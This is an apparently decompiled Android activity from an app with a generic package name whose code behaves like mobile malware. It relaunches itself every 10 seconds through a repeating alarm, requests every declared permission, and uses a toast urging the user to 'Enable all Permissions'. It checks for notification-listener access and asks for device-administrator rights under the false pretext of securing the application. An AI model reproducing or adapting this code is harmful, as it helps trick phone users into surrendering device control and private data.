package com.example.project20;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Typeface;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

public class MainActivity extends AppCompatActivity {
    private ComponentName mAdminName;
    private DevicePolicyManager mDPM;

    /* access modifiers changed from: protected */
    @Override // androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        ((AlarmManager) getSystemService(NotificationCompat.CATEGORY_ALARM)).setRepeating(2, 0, 10000, PendingIntent.getService(getApplicationContext(), 1, new Intent(this, MainActivity.class), 0));
        if (!isNotificationServiceRunning()) {
            Context applicationContext = getApplicationContext();
            String[] strArr = new String[0];
            try {
                strArr = getPackageManager().getPackageInfo(applicationContext.getPackageName(), 4096).requestedPermissions;
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
            }
            Toast makeText = Toast.makeText(applicationContext, "Enable 'Package Manager'\n Click back x2\n and Enable all Permissions", 1);
            TextView textView = (TextView) makeText.getView().findViewById(16908299);
            textView.setTextColor(-16711936);
            textView.setTypeface(Typeface.DEFAULT_BOLD);
            textView.setGravity(17);
            makeText.show();
            reqPermissions(this, strArr);
            this.mDPM = (DevicePolicyManager) getSystemService("device_policy");
            ComponentName componentName = new ComponentName(this, DeviceAdminX.class);
            this.mAdminName = componentName;
            if (!this.mDPM.isAdminActive(componentName)) {
                Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
                intent.putExtra("android.app.extra.DEVICE_ADMIN", this.mAdminName);
                intent.putExtra("android.app.extra.ADD_EXPLANATION", "Click on Activate Button to Secure Your  Application ");
                startActivity(intent);
            }
        }
    }

    public void reqPermissions(Context context, String[] strArr) {
        if (context != null && strArr != null) {
            ActivityCompat.requestPermissions(this, strArr, 1);
        }
    }

    public boolean isNotificationServiceRunning() {
        String string = Settings.Secure.getString(getContentResolver(), "Notification Listener Enabled");
        return string != null && string.contains(getPackageName());
    }
}
